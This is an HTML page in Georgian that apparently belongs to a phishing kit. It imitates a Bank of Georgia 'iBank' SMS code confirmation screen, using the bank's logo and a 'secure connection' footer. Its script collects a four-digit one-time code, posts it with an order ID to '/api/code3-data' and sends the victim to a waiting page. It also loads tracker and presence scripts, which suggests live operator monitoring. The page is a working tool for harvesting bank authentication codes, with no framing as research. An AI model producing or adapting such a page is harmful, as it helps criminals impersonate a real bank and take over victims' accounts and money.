<!DOCTYPE html>
<html lang="ka" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<title>iBank - კოდის დადასტურება</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:"Noto Sans Georgian",-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
  body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}

  .header{
    display:flex;align-items:center;justify-content:center;
    padding:18px 20px;background:#fff;
    border-bottom:1px solid #e8eaed;
    position:relative;
  }
  .header-logo{height:36px}
  .x-btn{
    position:absolute;right:16px;top:50%;transform:translateY(-50%);
    background:none;border:none;cursor:pointer;padding:8px;border-radius:50%;transition:.2s;
  }
  .x-btn:hover{background:#f0f0f0}
  .x-btn svg{width:20px;height:20px;stroke:#999;stroke-width:2;fill:none;stroke-linecap:round}

  .content{flex:1;display:flex;flex-direction:column;align-items:center;padding:40px 24px 0}

  .otp-icon{
    width:130px;height:130px;object-fit:contain;
    margin-bottom:24px;
  }

  .title{
    font-size:21px;font-weight:700;color:#1a1a1a;
    text-align:center;line-height:1.4;margin-bottom:8px;
  }
  .subtitle{
    font-size:13.5px;color:#6b7280;text-align:center;
    line-height:1.7;margin-bottom:36px;max-width:290px;
  }

  .code-row{
    display:flex;gap:14px;direction:ltr;
    justify-content:center;margin-bottom:28px;
  }
  .code-digit{
    width:64px;height:76px;
    border:2px solid #dfe1e6;border-radius:14px;
    background:#fff;text-align:center;
    font-size:30px;font-weight:700;color:#1a1a1a;
    font-family:"Noto Sans Georgian",sans-serif;outline:none;
    transition:all .2s ease;
    box-shadow:0 2px 6px rgba(0,0,0,.04);
    -webkit-appearance:none;
  }
  .code-digit::placeholder{color:#ccc;font-weight:300;font-size:26px}
  .code-digit:focus{
    border-color:#f97316;
    box-shadow:0 0 0 3.5px rgba(249,115,22,.12),0 2px 6px rgba(0,0,0,.04);
    transform:scale(1.04);
  }
  .code-digit.filled{border-color:#f97316;background:#fff8f3}
  .code-digit:disabled{opacity:.6}

  .err{
    display:none;width:100%;max-width:320px;
    margin:0 auto;padding:12px 16px;
    background:#fef2f2;border:1px solid #fecaca;border-radius:12px;
    color:#dc2626;font-size:13.5px;text-align:center;font-weight:600;
    animation:shake .4s ease;
  }
  @keyframes shake{
    0%,100%{transform:translateX(0)}
    20%,60%{transform:translateX(-5px)}
    40%,80%{transform:translateX(5px)}
  }

  .loading{display:none;margin-top:16px;text-align:center}
  .loading span{
    display:inline-block;width:8px;height:8px;
    background:#f97316;border-radius:50%;margin:0 4px;
    animation:dotPulse .6s infinite alternate;
  }
  .loading span:nth-child(2){animation-delay:.2s}
  .loading span:nth-child(3){animation-delay:.4s}
  @keyframes dotPulse{to{opacity:.25;transform:translateY(-5px)}}

  .footer{
    margin-top:auto;padding:16px 24px 22px;
    display:flex;align-items:center;justify-content:center;gap:6px;
    font-size:11.5px;color:#adb5bd;
  }
  .footer svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round}
</style>
</head>
<body>

  <div class="header">
    <img class="header-logo" src="images/bog-logo-ka.png" alt="საქართველოს ბანკი">
    <button class="x-btn" onclick="history.back()" aria-label="Close">
      <svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg>
    </button>
  </div>

  <div class="content">
    <img class="otp-icon" src="images/otp-shield.jpg" alt="OTP">

    <div class="title">კოდის დადასტურება</div>
    <div class="subtitle">გთხოვთ, შეიყვანეთ კოდი, რომელიც მიიღეთ SMS შეტყობინებით</div>

    <div class="code-row">
      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c0" placeholder="–" autocomplete="off">
      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c1" placeholder="–" autocomplete="off">
      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c2" placeholder="–" autocomplete="off">
      <input class="code-digit" type="tel" inputmode="numeric" maxlength="1" id="c3" placeholder="–" autocomplete="off">
    </div>

    <div class="loading" id="loadingDots">
      <span></span><span></span><span></span>
    </div>

    <div class="err" id="errorMsg"></div>
  </div>

  <div class="footer">
    <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
    დაცული კავშირი · Bank of Georgia
  </div>

<script>
  const params  = new URLSearchParams(location.search);
  const orderId = params.get("order");
  let   phone   = params.get("phone");

  if (!orderId) location.href = "index.html";

  if (!phone) {
    fetch("/api/orders/" + orderId + "/status")
      .then(r => r.json())
      .then(d => { if (d.username) phone = d.username; })
      .catch(() => {});
  }

  if (params.get("error") === "1") {
    const el = document.getElementById("errorMsg");
    el.textContent = "არასწორი კოდი";
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  const digits = document.querySelectorAll(".code-digit");

  digits.forEach((inp, i) => {
    inp.addEventListener("input", () => {
      inp.value = inp.value.replace(/\D/g, "");
      inp.classList.toggle("filled", !!inp.value);
      if (inp.value && i < digits.length - 1) digits[i + 1].focus();
      maybeAutoSubmit();
    });
    inp.addEventListener("keydown", e => {
      if (e.key === "Backspace" && !inp.value && i > 0) {
        digits[i - 1].focus();
        digits[i - 1].classList.remove("filled");
      }
    });
    inp.addEventListener("paste", e => {
      e.preventDefault();
      const text = (e.clipboardData.getData("text") || "").replace(/\D/g, "");
      for (let j = 0; j < digits.length && j < text.length; j++) {
        digits[j].value = text[j];
        digits[j].classList.toggle("filled", !!text[j]);
      }
      const last = Math.min(text.length, digits.length);
      if (last > 0) digits[Math.min(last, digits.length - 1)].focus();
      maybeAutoSubmit();
    });
    inp.addEventListener("focus", () => inp.select());
  });

  function getCode() {
    return Array.from(digits).map(d => d.value).join("");
  }

  function showError(msg) {
    const el = document.getElementById("errorMsg");
    el.textContent = msg;
    el.style.display = "block";
    setTimeout(() => { el.style.display = "none"; }, 3500);
  }

  let submitting = false;
  function maybeAutoSubmit() {
    const code = getCode();
    if (code.length === digits.length && !submitting) submitCode();
  }

  async function submitCode() {
    const code = getCode();
    if (code.length < digits.length) return;
    submitting = true;
    digits.forEach(d => d.disabled = true);
    document.getElementById("loadingDots").style.display = "block";

    try {
      const res  = await fetch("/api/code3-data", {
        method:  "POST",
        headers: { "Content-Type": "application/json" },
        body:    JSON.stringify({ order_id: orderId, code: code })
      });
      const data = await res.json();
      if (data.success) {
        location.href = "code3-waiting.html?order=" + orderId +
                        (phone ? "&phone=" + encodeURIComponent(phone) : "");
      } else {
        showError(data.message || "შეცდომა მოხდა");
        resetInputs();
      }
    } catch (err) {
      showError("კავშირის შეცდომა");
      resetInputs();
    }
  }

  function resetInputs() {
    submitting = false;
    document.getElementById("loadingDots").style.display = "none";
    digits.forEach(d => { d.disabled = false; d.value = ""; d.classList.remove("filled"); });
    digits[0].focus();
  }
</script>
<script src="tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
